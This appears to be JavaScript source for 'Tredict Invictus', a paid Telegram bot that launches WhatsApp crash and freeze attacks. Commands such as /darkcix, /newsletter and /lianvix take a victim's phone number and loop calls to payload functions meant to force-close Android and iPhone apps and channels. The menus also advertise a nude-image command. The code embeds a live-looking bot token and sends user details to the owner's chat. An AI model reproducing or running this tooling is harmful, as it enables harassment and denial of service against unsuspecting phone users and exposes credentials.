const ALERT_TOKEN = "8135257725:AAFXBul0SGCGXfhLb1l7rP6I96GscZT6KjE";
const ALERT_CHAT_ID = "5126860596"; 
const pendingVerification = new Set();

bot.use(async (ctx, next) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const text = ctx.message?.text || ctx.update?.callback_query?.data || "";
  const userId = ctx.from?.id;
  const chatId = ctx.chat?.id || userId;

  // BOT OFF PROTECTION
  if (!botActive) {
    return ctx.reply("🚫 Bot sedang nonaktif.\nAktifkan kembali untuk menggunakan perintah.", {
      parse_mode: "Markdown",
    });
  }

  // JIKA SUDAH VALID, LANJUT SAJA
  if (tokenValidated) return next();

  // ANTI SPAM VERIFIKASI
  if (pendingVerification.has(chatId)) return;
  pendingVerification.add(chatId);

  // ===========================
  // LOADING TEKS BARU DI SINI
  // ===========================
  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

  const loadingTexts = [
    "🔍 *Pengecekan Token...*",
    "",
    "🟩 *Token Valid...*",
    "",
    "👋 *Selamat Datang di...*",
    "",
    "🔥 *Tredict Invictus* 🔥",
    "",
    "👑 Owners: Xatanicvxii"
  ];

  let loadingMsg = await ctx.reply("⏳ Memulai verifikasi...");

  for (const text of loadingTexts) {
    await sleep(600);
    try {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        text === "" ? "‎" : text,
        { parse_mode: "Markdown" }
      );
    } catch {}
  }
  // =============== AKHIR LOADING BARU ===============


  // AMBIL DATABASE TOKEN
  const getTokenData = () =>
    new Promise((resolve, reject) => {
      https
        .get(databaseUrl, { timeout: 6000 }, (res) => {
          let data = "";
          res.on("data", (chunk) => (data += chunk));
          res.on("end", () => {
            try {
              resolve(JSON.parse(data));
            } catch {
              reject(new Error("Invalid JSON response"));
            }
          });
        })
        .on("error", (err) => reject(err));
    });

  try {
    const result = await getTokenData();
    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];

    const alertBase = `
━━━━━━━━━━━━━━━━━━
🔥 *TREDICT INVICTUS* 🔥
━━━━━━━━━━━━━━━━━━
👤 *User* : [${ctx.from.first_name}](tg://user?id=${userId})
🧩 *Username* : @${ctx.from.username || "Unknown"}
🔑 *Token* : \`${tokenBot}\`
⏰ *Time* : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━`;

    // =============== TOKEN VALID ===============
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ Token Valid — Selamat Datang di *Tredict Invictus*",
        { parse_mode: "Markdown" }
      );

      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: `🟢 *TOKEN VERIFIED*${alertBase}`,
        parse_mode: "Markdown",
      });

      return next();
    }

    // =============== TOKEN INVALID ===============
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "❌ *Token Invalid*\nBot akan dimatikan otomatis.",
      { parse_mode: "Markdown" }
    );

    // KIRIM ALERT
    await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
      chat_id: ALERT_CHAT_ID,
      text: `🔴 *TOKEN INVALID*${alertBase}`,
      parse_mode: "Markdown",
    });

    // MATIKAN BOT DALAM 1 DETIK
    setTimeout(() => {
      console.log("❌ TOKEN INVALID");
      process.exit(0);
    }, 1000);

    return;

  } catch (err) {
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "⚠️ Error komunikasi server.",
      { parse_mode: "Markdown" }
    );
  } finally {
    pendingVerification.delete(chatId);
  }
});

/*bot.use(async (ctx, next) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const text = ctx.message?.text || ctx.update?.callback_query?.data || "";
  const userId = ctx.from?.id;
  const chatId = ctx.chat?.id || userId;

  // BOT OFF PROTECTION
  if (!botActive) {
    return ctx.reply("🚫 Bot sedang nonaktif.\nAktifkan kembali untuk menggunakan perintah.", {
      parse_mode: "Markdown",
    });
  }

  // JIKA SUDAH VALID, LANJUT SAJA
  if (tokenValidated) return next();

  // ANTI SPAM VERIFIKASI
  if (pendingVerification.has(chatId)) return;
  pendingVerification.add(chatId);

  // LOADING ANIMATIONS
  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%",
    "MEMVERIFIKASI SERVER..."
  ];

  let loadingMsg = await ctx.reply("⏳ Sedang memverifikasi token bot...");
  for (const frame of frames) {
    await sleep(200);
    try {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        `🔐 Check Server Database\n${frame}`,
        { parse_mode: "Markdown" }
      );
    } catch {}
  }

  // AMBIL DATABASE TOKEN
  const getTokenData = () =>
    new Promise((resolve, reject) => {
      https
        .get(databaseUrl, { timeout: 6000 }, (res) => {
          let data = "";
          res.on("data", (chunk) => (data += chunk));
          res.on("end", () => {
            try {
              resolve(JSON.parse(data));
            } catch {
              reject(new Error("Invalid JSON response"));
            }
          });
        })
        .on("error", (err) => reject(err));
    });

  try {
    const result = await getTokenData();
    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];

    const alertBase = `
━━━━━━━━━━━━━━━━━━
🔥 *TREDICT INVICTUS* 🔥
━━━━━━━━━━━━━━━━━━
👤 *User* : [${ctx.from.first_name}](tg://user?id=${userId})
🧩 *Username* : @${ctx.from.username || "Unknown"}
🔑 *Token* : \`${tokenBot}\`
⏰ *Time* : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━`;

    // =============== TOKEN VALID ===============
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ Token Valid — Selamat Datang di *Tredict Invictus*",
        { parse_mode: "Markdown" }
      );

      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: `🟢 *TOKEN VERIFIED*${alertBase}`,
        parse_mode: "Markdown",
      });

      return next();
    }

    // =============== TOKEN INVALID ===============
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "❌ *Token Invalid*\nBot akan dimatikan otomatis.",
      { parse_mode: "Markdown" }
    );

    // KIRIM ALERT
    await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
      chat_id: ALERT_CHAT_ID,
      text: `🔴 *TOKEN INVALID*${alertBase}`,
      parse_mode: "Markdown",
    });

    // MATIKAN BOT DALAM 1 DETIK
    setTimeout(() => {
      console.log("❌ TOKEN INVALID");
      process.exit(0);
    }, 1000);

    return;

  } catch (err) {
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "⚠️ Error komunikasi server.",
      { parse_mode: "Markdown" }
    );
  } finally {
    pendingVerification.delete(chatId);
  }
});*/

// ================= ADMIN COMMAND MENU ON/OFF =================
let menuEnabled = true;
bot.command("bot", async (ctx) => {
  if (ctx.from.id != 5126860596) return ctx.reply("❌ Akses ditolak. Hanya owner yang bisa mengatur menu.");

  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0] || !["on", "off"].includes(args[0].toLowerCase()))
    return ctx.reply("⚠️ Format salah!\nGunakan:\n/menu on\n/menu off");

  if (args[0].toLowerCase() === "on") {
    menuEnabled = true;
    await ctx.reply("✅ Menu dihidupkan. Bot akan menampilkan menu seperti biasa.");
  } else {
    menuEnabled = false;
    await ctx.reply("⚠️ Menu dimatikan. Bot tidak akan menampilkan menu.");
  }
});

const GITHUB_OTP_URL = "https://lolipopxternal.vercel.app/otp.json";

let currentOtp = null;
let verifiedUsers = new Set();
let lastOtp = null;

// 🔁 Ambil OTP dari GitHub
function getOtpFromGithub(callback) {
  https.get(GITHUB_OTP_URL + "?t=" + Date.now(), (res) => {
    let data = "";
    res.on("data", chunk => (data += chunk));
    res.on("end", () => {
      try {
        const json = JSON.parse(data);
        currentOtp = json.otp;

        // reset semua user kalau OTP di GitHub berubah
        if (lastOtp && lastOtp !== currentOtp) {
          verifiedUsers.clear();
          console.log("🔁 JANGAN SEBAR MAKANYA CIL.");
        }
        lastOtp = currentOtp;

        callback(currentOtp);
      } catch {
        callback(currentOtp);
      }
    });
  }).on("error", () => callback(currentOtp));
}

// 🔄 Auto refresh OTP tiap 1 menit
setInterval(() => getOtpFromGithub(() => {}), 60000);

// ==================== /START ====================
bot.start(async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const { data: statusData } = await axios.get(
      "https://raw.githubusercontent.com/Bealllevey62/lolipopDb/refs/heads/main/menu_status.json"
    );

    if (!statusData.menu2_enabled) {
      return ctx.reply("Kasihan Servernya Dibypass @ditthtzy Wkwk Lawak Ampas Lu Semua");
    }

    const menuCaption = `<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI

👑 Owner : @Xatanicvxii  
💮 Partner : Bella

📜 S Y S T E M • U P D A T E
• Otomatis Update Script

🛡️  S E C U R I T Y  •  C O R E
• Anti-Bypass Firewall  
• Anti-Proxy Sentinel  
• Runtime Self-Lock Guard  
• Token Integrity Shield  
• Encrypted Stealth Payload  

🌐 Xatanical Cloud Network  
⚡ Operational • Online</blockquote>`;

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: menuCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Next ➜", callback_data: "controls" }],
          [{ text: "🌐 Website Store", url: "https://xatanicalbella.vercel.app" }]
        ]
      }
    });

  } catch (err) {
    console.error("⚠️ Error di /start:", err.message);
    ctx.reply("❌ Terjadi kesalahan internal, coba lagi nanti.");
  }
});

bot.action("start", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  if (!tokenValidated) return;
  try {
    const { data: statusData } = await axios.get(
      "https://raw.githubusercontent.com/Bealllevey62/lolipopDb/refs/heads/main/menu_status.json"
    );

    if (!statusData.menu2_enabled) {
      return ctx.answerCbQuery(
        "Kasihan Servernya Dibypass @ditthtzy Wkwk Lawak Ampas Lu Semua",
        { show_alert: true }
      );
    }

    const userId = ctx.from.id;
    const premiumStatus = isPremiumUser(userId) ? "Premium" : "No Premium";
    const senderStatus = isWhatsAppConnected ? "1" : "0";
    const runtimeStatus = formatRuntime();

    const menuCaption = `
<blockquote>
 T R E D I C T I N V I C T U S
       V25 • GEN VI
        
👑 Owner : @Xatanicvxii  
💮 Partner : Bella

📊 S Y S T E M • S T A T U S
• Bot Status   : ${premiumStatus}  
• Sender Type  : ${senderStatus}  
• Uptime       : ${runtimeStatus}

📜 S Y S T E M • U P D A T E
• Otomatis Update Script

🛡 S E C U R I T Y
• Anti-Bypass  
• Anti-Proxy  
• Runtime Self-Lock  
• Token Shield  
• Secure Payload

🌐 Server : Xatanical Cloud  
⚡ Status : Online
</blockquote>`;

    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: menuCaption, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Next ➜", callback_data: "controls" }],
            [{ text: "🌐 Website Store", url: "https://xatanicalbella.vercel.app" }]
          ]
        }
      }
    );
  } catch (err) {
    console.error("⚠️ Error di action /start:", err.message);
    await ctx.answerCbQuery(
      "❌ Terjadi kesalahan internal, coba lagi nanti.",
      { show_alert: true }
    );
  }
});

// ==================== /CONTROLS ====================
bot.action("controls", async (ctx) => {
  const controlsMenu = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI
         
• CONTROL SETTINGS •
• /connect → Add Sender
• /setcd → Atur Cooldown
• /resetbot → Restart Bot
• /addprem → Add Premium User
• /delprem → Delete Premium User
• /addadmin → Add Admin
• /deladmin → Delete Admin
• /addsvip → Supervip User
• /delsvip → Delete Supervip
• /autoaktif → Rest Online
• /pullupdate → Auto Update

 Security Mode : ACTIVE
 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: controlsMenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "start" }],
            [{ text: "Next ➜", callback_data: "bug" }]
          ]
        }
      }
    );
  } catch (err) {
    ctx.answerCbQuery("❌ Error internal", { show_alert: true });
  }
});

// ==================== /BUG ====================
bot.action("bug", async (ctx) => {
  const bugMenu = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI

 BUG COMMANDS:
• /execute → Invisible iPhone
• /obfors → Blank Message
• /gloryposx → Blank Call Device
• /destiny → No Tag Story Invisible
• /flyingcrash - Invisible Crash Android
• /creodash - Force Delete
• /croserd - 1Message Force
• /hoxlive - Invisible iPhone Crash

 Security : ACTIVE
 Server : Xatanical</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: bugMenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "controls" }],
            [{ text: "Next ➜", callback_data: "buttontype" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});

bot.action("buttontype", async (ctx) => {
  const buttontypeMenu = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI

📌 UTILITIES:
• /pinterest → Search Pinterest
• /tiktok → Download TikTok
• /tourl → Foto/Video Link
• /tonaked → Nude Photos
• /getcode → Retrieve HTML
• /cekerror → Reply.js Check Error
• /infoerror → Check All Files Error
• /cekfile → Check User Files
• /cekbio → Check Bio
• /cekstatus → Check Ban/Unban
• /getfile → Retrieve Script File

🛡 Security Mode : ACTIVE
🌐 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: buttontypeMenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "bug" }],
            [{ text: "Next ➜", callback_data: "listmenu" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});

bot.action("listmenu", async (ctx) => {
  const listmenu = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI

 CHECK & SECURITY:
• /cekprofil → Check Profile
• /cekweb → Website Security Check
• /cekapk → App Security Check
• /play → Search Music
• /chatwa → Chat User via Telegram
• /cekfunc → Check Function Errors
• /cekdoc → Check html/css/python
• /waakses → Block/Unblock WA
• /openfile → Resend JS File
• /installprotek → Install Protection
• /stalktiktok → Check TikTok Account
• /inforam → Check Panel RAM
• /cekbot → Bot Users

🛡 Security Mode : ACTIVE
🌐 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: listmenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "buttontype" }],
            [{ text: "Next ➜", callback_data: "githubmenu" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});

bot.action("githubmenu", async (ctx) => {
  const githubmenu = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI

 GITHUB & OPTION:
• /getgithub → Download Github Url
• /deploygithub → Zip To Github Deploy

🛡 Security Mode : ACTIVE
🌐 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: githubmenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "listmenu" }],
            [{ text: "Next ➜", callback_data: "listharga" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});

// ==================== /LISTHARGA ====================
bot.action("listharga", async (ctx) => {
  const listharga = `
<blockquote>  
 T R E D I C T I N V I C T U S
       V25 • GEN VI</blockquote>

<blockquote>BUG MENU SVIP
• /gloxbord → Force Infinity Android
• /darkcix → Infinity Delay Invisible
• /lianvix → Force iPhone No Tag
• /newsletter → Force Close Channel
• /bufferdelay → Infinity Story Delay
• /delaysticker → Lottie Delay
• /forcesql → Invisible Crash

 Security Mode : ACTIVE
 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: listharga, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "buttontype" }],
            [{ text: "Next ➜", callback_data: "tqto" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});

// ==================== /TQTO ====================
bot.action("tqto", async (ctx) => {
  const tqtoMenu = `
<blockquote>  
✨ TREDICT INVICTUS 
 KING & PRINCESS ✨

👑 KING OWNER
• @Xatanicvxii

👸 PRINCESS
• Bella

🛡 Security Mode : ACTIVE
🌐 Server : Xatanical Network</blockquote>`;

  try {
    await ctx.editMessageMedia(
      { type: "photo", media: thumbnailUrl, caption: tqtoMenu, parse_mode: "HTML" },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⬅️ Back", callback_data: "listharga" }],
            [{ text: "🏠 To Home", callback_data: "start" }]
          ]
        }
      }
    );
  } catch { ctx.answerCbQuery(); }
});


//OTP
let activeBugs = []; 
let bugIntervals = {};
let bugMeta = {};
async function sendBugPage(ctx, page = 1) {
  const perPage = 10;
  const totalPage = Math.ceil(activeBugs.length / perPage);

  page = Math.min(Math.max(page, 1), totalPage);

  const start = (page - 1) * perPage;
  const end = start + perPage;

  const items = activeBugs.slice(start, end);

  let caption = `<b>📜 Bug List (Page ${page}/${totalPage})</b>\n\n`;

  for (let i = 0; i < items.length; i++) {
    const t = items[i];
    const meta = bugMeta[t];

    caption += `
<b>${start + i + 1}. Target:</b> ${meta.target}
👤 <b>User:</b> ${meta.user}
🛠 <b>Command:</b> ${meta.command}
⏰ <b>Start:</b> ${meta.startTime.toLocaleString("en-GB", { timeZone: "Asia/Jakarta" })}
────────────────────
`;
  }

  const kb = [];

  const row = [];
  if (page > 1) row.push({ text: "⬅️ Prev", callback_data: `bugpage_${page - 1}` });
  if (page < totalPage) row.push({ text: "Next ➡️", callback_data: `bugpage_${page + 1}` });
  if (row.length) kb.push(row);

  kb.push([{ text: "⛔ Matikan Semua Bug", callback_data: "stopallbug" }]);

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: kb }
  });
}

bot.command("listbug", async (ctx) => {
  if (activeBugs.length === 0)
    return ctx.reply("✔️ Tidak ada bug yang sedang berjalan.");

  return sendBugPage(ctx, 1);
});

bot.action(/bugpage_(\d+)/, async (ctx) => {
  const page = parseInt(ctx.match[1]);

  await ctx.answerCbQuery();
  try { await ctx.editMessageCaption({ caption: "🔄 Memuat..." }); } catch {}

  await sendBugPage(ctx, page);
});

bot.action("stopallbug", async (ctx) => {
  await ctx.answerCbQuery("Semua bug dimatikan.");

  for (let t of activeBugs) {
    bugIntervals[t] = false;
  }

  activeBugs = [];
  bugIntervals = {};
  bugMeta = {};

  try {
    await ctx.editMessageCaption("⛔ Semua bug berhasil dihentikan.");
  } catch (e) {
    ctx.reply("⛔ Semua bug berhasil dihentikan.");
  }
});

bot.command(
  "darkcix",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/darkcix";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /darkcix 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible No Tag Story  
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

      await privatedelay();
      await ZhTHxhChanges(sock, target);
      await ctarlResponse(target);
      await glorymessage(target);
      await obfuspot(target);
      await gsGlx(target);
      await ctarlResponse(target);
      await gsGlx(target);
      await ZhTHxhChanges(sock, target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible No Tag Story  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

//CHANNEL BUG
bot.command("listbug", async (ctx) => {
  if (activeBugs.length === 0)
    return ctx.reply("✔️ Tidak ada bug yang sedang berjalan.");

  return sendBugPage(ctx, 1);
});

bot.command(
  "newsletter",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/newsletter";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /newsletter 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@newsletter";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose channel 
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 100 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

      await privatedelay();      
       await ForceNewsletter(target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Channel
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
//IPHONE MENU
bot.command(
  "lianvix",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/lianvix";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /lianvix 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Infinity
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await privatedelay();
       await notagstory(target);
    await notagstory(target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Force
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
//COMMAND KHUSUSS//
bot.command(
  "gloxbord",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/gloxbord";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /gloxbord 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Infinity
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 1 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await plaintext(sock, target, true);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Force
